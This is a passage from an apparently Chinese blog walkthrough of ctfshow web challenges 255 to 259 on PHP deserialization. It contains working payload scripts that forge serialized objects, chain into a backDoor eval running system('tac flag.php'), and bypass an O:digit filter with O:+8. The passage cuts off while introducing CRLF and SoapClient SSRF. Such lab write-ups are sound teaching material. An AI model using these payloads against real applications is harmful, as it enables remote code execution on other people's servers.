class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>查看源码<br>依然需要通过GET传入参数username和password。值也是需要和ctfShowUser类里的一样。<br>区别在于，多了个COOKIE传参，我们需要通过COOKIE传入参数user.<br>由于后面需要参数isVip&#x3D;true，所以写脚本序列化后拿给user即可。</p></li><li><p>写脚本传参</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到序列化后的字符串，赋给user<br>COOKIE: <code>user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code><br>GET: <code>?username=xxxxxx&amp;password=xxxxxx</code><br>成功拿到flag</p></li></ol><h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题相较于上一题的区别在于多了验证变量username与password是否相等，不相等才能输出flag。</p></li><li><p>构造payload<br>脚本改造如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只需要将cookie的值改为这个脚本输出的值，并且get传入的参数与脚本username和password相等即可。<br>成功拿到flag</p></li></ol><h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><code>__construct()函数</code><br>对象创建时自动调用，对对象进行初始化。</li><li><code>__destruct()函数</code><br>当所有操作执行完毕后，有需要释放的对象会自动触发该方法。</li></ul><p>与之前相比变化的地方在于，public变量变为了private变量，并且ctfShowUser类里多了一个私有变量class，多了两个魔术方法与两个类<br>我们可以看到类backDoor里有我们需要的eval函数，通过这个函数执行我们想执行的代码。</p><ol start="2"><li>构造payload<br>于是我们可以写如下脚本来或许序列化后的字符串：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span>=<span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span>()</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>这个脚本将原本实例化类info的class变量改为了backDoor，并且在类backDoor里将变量code赋值为能够显示flag的代码。<br>系统命令可以用tac，tac是cat命令的反转，它使行逆序显示文件内容。也可以使用cat命令，但是需要在源码中找寻flag<br>GET参数与上一题不变：<br><code>?username=1&amp;password=2</code><br>成功拿到flag</li></ol><h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上一题的区别只是在于增加了过滤，不允许字母o或c后面出现数字，我们可以使用加号（+）绕过。如 O:+8</p></li><li><p>构造payload<br>脚本和上一题相似，但我们不使用urlencode了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span>()</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到的序列化字符如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">&quot;ctfShowUser&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;backDoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;system(&quot;</span>tac flag.php<span class="string">&quot;);&quot;</span>;&#125;&#125; <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>将 O:数字 格式的所有数字前加上加号（+），并进行url编码，之后送给Cookie中的user<br>GET传参与上一题相同<br>成功拿到flag</p></li></ol><h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><ol><li>查看源码<br>页面源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure>flag.php源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这道题所涵盖的知识很多，这里先贴两篇文章：<br><a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">CRLF</a><br><a href="https://www.secpulse.com/archives/165358.html">SoapClient</a></li></ol><ul><li>CRLF<br>CRLF是回车和换行的简称 <code>\r\n</code><br>在HTTP协议中，HTTP 